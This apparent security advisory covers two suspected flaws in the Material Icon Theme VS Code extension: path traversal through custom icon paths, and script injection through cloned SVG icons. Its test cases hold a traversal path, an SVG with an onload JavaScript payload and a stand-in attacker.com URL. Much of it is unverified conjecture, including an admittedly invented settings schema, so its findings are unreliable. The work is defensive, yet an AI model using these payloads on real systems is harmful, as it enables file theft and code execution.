### Vulnerabilities in Material Icon Theme Extension

This document outlines identified security vulnerabilities within the Material Icon Theme extension for VS Code, focusing on risks associated with custom SVG icons and their handling.

#### 1. Path Traversal and Local File Access via Custom SVG Icons

- **Description:**
    1. A user can configure custom file, folder, or language icon associations within the Material Icon Theme extension settings in VS Code. This is done by modifying the `settings.json` file, specifically within the `"material-icon-theme.files.associations"` setting.
    2. In these settings, users can specify a path to a custom SVG icon file. The documentation suggests placing custom icons within the extension's distribution folder or the user's `.vscode/extensions` directory.
    3. However, the extension may fail to properly validate or sanitize the user-provided file paths. If insufficient validation is performed, an attacker can craft a malicious path containing directory traversal sequences such as `../../` or absolute paths.
    4. By inserting such a path into the settings, an attacker can potentially instruct the extension to load SVG icons from locations outside the intended and secure directories, potentially accessing sensitive files and directories on the local file system.
    5. When VS Code processes these settings and attempts to display icons, the Material Icon Theme extension, lacking proper path validation, attempts to access files based on these attacker-controlled paths.

- **Impact:**
    - **Arbitrary File Read:** Successful path traversal can allow an attacker to read arbitrary files on the user's system. This includes sensitive configuration files, application data, or personal documents, depending on the file paths they can construct and the permissions of the VS Code process.
    - **Information Disclosure:** Reading sensitive files can lead to direct disclosure of confidential information. Even if the file content is not directly displayed as an icon, the attempt to access and potentially process the file can be logged or observed, confirming the vulnerability and potentially revealing file existence and accessibility.
    - **Potential Client-Side Injection (Secondary Risk):** If the extension attempts to render the content of a traversed file as an SVG icon, and if the traversed file happens to be an SVG or is treated as such, and if SVG sanitization is also missing, a malicious SVG file obtained via path traversal could lead to client-side injection. This is a less direct impact of path traversal itself but a possible consequence if combined with other vulnerabilities.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - **Documentation Restriction:** The extension's documentation advises users to place custom icons within the `extensions` directory of the `.vscode` folder in the user directory. It suggests that custom icon directories should be within a designated folder.
    - **Implicit Trust/Convention:** There is an implicit expectation that users will adhere to the documented guidelines and only provide paths within the intended directories. However, this is a convention and not a programmatically enforced mitigation.
    - **No Runtime Checks:** There is no evidence of runtime validation or sanitization of user-supplied file paths in the extension's code. The extension does not appear to programmatically verify that the resolved path for a custom icon remains within permitted directories.

- **Missing Mitigations:**
    - **Strict Path Validation:** Implement robust input validation and sanitization for user-provided file paths for custom icons in `settings.json`. This should include checking for and rejecting directory traversal sequences (e.g., `../`) and absolute paths if they are not intended to be supported.
    - **Path Normalization and Whitelisting:** Implement path normalization to resolve relative paths securely, relative to a defined allowed base directory. Enforce a whitelist or allowed directory prefix check to ensure that the resolved path for any custom icon always stays within the designated safe directories (e.g., within the extension's directory or a specific user icons directory). Use secure path joining functions that prevent path traversal.
    - **Enforcement Mechanism:** Develop and implement a robust enforcement mechanism within the extension to strictly restrict custom icon file access to within the intended directories. Prevent any file system operations that attempt to access files outside of these allowed boundaries.

- **Preconditions:**
    - The user must have the "Material Icon Theme" extension installed and activated in VS Code.
    - An attacker must be able to influence the victim's VS Code settings. This can be achieved by:
        - **Social Engineering:** Tricking a user into manually adding a malicious custom icon association to their VS Code settings.
        - **Malicious Workspace Configuration:** Providing a malicious workspace configuration file that includes the harmful settings.
        - **Shared Settings Repository:** Contributing to or compromising a public settings repository that the user might import or use.
        - **Direct Settings Modification:** In scenarios where the attacker has some level of access to the user's environment, they might directly modify the user's `settings.json` file.

- **Source Code Analysis:**
    - Detailed source code analysis requires access to the extension's codebase. Key areas to investigate include:
        1. **Settings Processing Module:** Identify the code responsible for reading and parsing VS Code settings, specifically how it handles the `"material-icon-theme.files.associations"` setting.
        2. **Path Construction Logic:** Examine how the extension constructs the full file paths for custom SVG icons based on the user-provided paths from settings. Look for string concatenation or path joining operations.
        3. **File System Access Functions:** Pinpoint the code sections that perform file system operations to load the custom SVG icon files. Identify the APIs used for file access (e.g., `fs.readFile`, `require`).
        4. **Path Validation and Sanitization (Absence Thereof):** Analyze the code for any path validation or sanitization steps applied to the user-provided file paths *before* file system access. Specifically, check for:
            - Path normalization functions.
            - Checks against allowed directories or prefixes.
            - Rejection of paths containing traversal sequences.
        5. **Error Handling in File Operations:** Examine how the extension handles errors during file access. Weak error handling might expose more information about the file system or access attempts.

    - Based on the vulnerability description, it is highly likely that the vulnerability stems from the absence of proper path validation before the extension attempts to load SVG files based on user-provided paths. The code likely directly concatenates user input with a base path without sufficient security checks.

- **Security Test Case:**
    1. **Setup:** Install VS Code and the "Material Icon Theme" extension.
    2. **Prepare a Sensitive File:** Create a dummy sensitive file (e.g., `sensitive-test-file.txt`) in your user home directory or another location you want to attempt to access.
    3. **Modify User Settings:** Open VS Code user settings (`settings.json`).
    4. **Add Malicious File Association:** Add the following configuration to your `settings.json`, attempting to associate a file extension with a custom icon path that traverses upwards to target your dummy sensitive file. Adjust the path `../../../../sensitive-test-file.txt` as needed for your environment:
       ```json
       "material-icon-theme.files.associations": {
           "testfile.vuln": "../../../../sensitive-test-file.txt"
       }
       ```
    5. **Create Trigger File:** Create a new file in your VS Code workspace named `testfile.vuln`.
    6. **Observe for File Access:**
        - **Using System Monitoring Tools:** Use system monitoring tools like `Process Monitor` (Windows) or `fs_usage` (macOS/Linux) to monitor file system access attempts by VS Code or the extension process when `testfile.vuln` is created or when VS Code is reloaded. Look for attempts to access `sensitive-test-file.txt` or similar paths.
        - **Error Messages (Less Reliable):** Observe if VS Code displays any error messages related to icon loading or file access when `testfile.vuln` is created. Error messages might indicate a failed attempt to access the file, but absence of errors doesn't necessarily mean the vulnerability is absent.
    7. **Verification:** If file access to `sensitive-test-file.txt` is observed in system monitoring tools (or if error messages suggest a file access attempt at the malicious path), it confirms the path traversal and local file access vulnerability.
    8. **Further Testing:** Experiment with different traversal paths and target different files to assess the extent of the vulnerability and potential bypass attempts for any partial mitigations.

#### 2. Malicious SVG Injection via Icon Cloning

- **Vulnerability Name:** Malicious SVG Injection via Icon Cloning

- **Description:**
    1. The Material Icon Theme extension supports a feature to "clone" existing icons and recolor them. This is configured through settings, specifying a base icon and new color values.
    2. The cloning mechanism is described as operating by replacing color attribute strings within the SVG file's text content.
    3. If this color replacement is performed via simple textual replacements without proper SVG parsing and sanitization, it introduces a security risk.
    4. A maliciously crafted SVG icon could contain embedded payloads such as `<script>` tags or JavaScript event handlers (e.g., `onload` attributes within SVG elements).
    5. If the cloning/recoloring process doesn't sanitize these malicious elements, they will be preserved in the cloned SVG output.
    6. When the cloned (or recolored) SVG is subsequently rendered by the extension in the VS Code UI, or if the extension exposes an npm module that renders these icons in web projects, the unsanitized SVG markup can execute embedded JavaScript code within the context of the VS Code environment or the web application.

- **Impact:**
    - **Execution of Arbitrary JavaScript:** Successful SVG injection can lead to the execution of arbitrary JavaScript code within the user's VS Code editor instance.
    - **Data Exfiltration and Unauthorized Actions:** Malicious JavaScript can be used for various malicious purposes, including exfiltrating sensitive data (like workspace content, VS Code settings, or tokens), performing unauthorized actions within VS Code on behalf of the user, or potentially escalating to further system compromise.
    - **Compromise of UI Integrity:** Rendering malicious icons can compromise the visual integrity of the VS Code interface, potentially misleading users or eroding trust in the extension and the VS Code environment.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - **Documentation Advice:** The documentation advises that all SVG icons should be "fully vectorized" (not contain embedded base64 images) and that only approved Material Design colors should be used for recoloring.
    - **Trusted Source Assumption:** There is an implicit assumption that base icons used for cloning are from a trusted source and are inherently safe.

- **Missing Mitigations:**
    - **SVG Content Sanitization:** No runtime sanitization or validation of the SVG content is performed *before* it is processed for cloning and recoloring.
    - **Secure Cloning Mechanism:** The cloning mechanism likely relies on simple string manipulation, which is insufficient to strip or neutralize dangerous elements and attributes within SVG markup. A proper SVG parser and sanitizer should be used to process SVG content securely.

- **Preconditions:**
    - An attacker needs to provide or influence the base SVG icon used for cloning. This could be achieved by:
        - **Malicious Custom Icon:** Convincing a user to use a custom SVG icon as a base that is already malicious.
        - **Compromised Icon Source:** If the extension fetches base icons from an external source, compromising that source to inject malicious icons.
        - **Configuration Manipulation:** Tricking a user into applying a configuration change that specifies a malicious SVG (either local or remote) as the base icon for cloning.
    - The extension must then process this potentially malicious SVG using its cloning/recoloring mechanism without applying any security filters or sanitization.

- **Source Code Analysis:**
    - Source code analysis is needed to confirm the cloning mechanism. Key points to investigate:
        1. **Cloning Implementation:** Locate the code that implements the icon cloning and recoloring feature.
        2. **SVG Processing Method:** Determine how SVG files are processed during cloning. Is it simple string replacement, or is a proper SVG parser used?
        3. **Sanitization Steps (Absence Thereof):** Check if there are any sanitization steps applied to the SVG content before or during the cloning process. Specifically, look for code that removes or neutralizes `<script>` tags, event handler attributes (like `onload`), or other potentially malicious SVG features.

    - Based on the description, the vulnerability likely exists because the cloning process relies on insecure string manipulation for color replacement, without any SVG sanitization.

- **Security Test Case:**
    1. **Prepare Malicious SVG:** Create a custom SVG file named `malicious.svg` with a malicious payload. For example, using an `onload` attribute within a `<rect>` element to execute JavaScript:
       ```xml
       <svg xmlns="http://www.w3.org/2000/svg">
         <rect width="16" height="16" fill="#FF0000" onload="alert('XSS')" />
       </svg>
       ```
    2. **Host Malicious SVG (Optional):** For testing remote SVG inclusion, host `malicious.svg` on a publicly accessible web server (e.g., `http://attacker.com/malicious.svg`). Alternatively, you can place it locally and reference it via a local path if the extension supports it for base icons.
    3. **Configure Icon Cloning in Settings:** In VS Code user settings (`settings.json`), configure a custom icon association that uses the malicious SVG as a *base icon* for cloning. The exact setting structure for icon cloning would need to be determined from the extension's documentation, but it might involve something like specifying a base icon path and recoloring parameters. Example (this is illustrative, the actual setting might differ):
       ```json
       "material-icon-theme.iconDefinitions": {
           "clonedMaliciousIcon": {
               "baseIconPath": "./path/to/or/url/to/malicious.svg", // Or "http://attacker.com/malicious.svg"
               "colorReplacements": [ {"from": "#FF0000", "to": "#00FF00"} ]
           }
       },
       "material-icon-theme.files.associations": {
           "test_clone.file": "clonedMaliciousIcon"
       }
       ```
    4. **Create Trigger File:** Create a file in your VS Code workspace named `test_clone.file`.
    5. **Observe for JavaScript Execution:** Observe if the malicious JavaScript code within `malicious.svg` is executed when the icon for `test_clone.file` is rendered. In the example SVG, an alert box with 'XSS' should appear if the vulnerability is present.
    6. **Verification:** If the alert box (or other expected malicious behavior) occurs, it confirms that JavaScript code embedded in the SVG was executed due to insecure cloning and rendering, demonstrating the Malicious SVG Injection via Icon Cloning vulnerability.
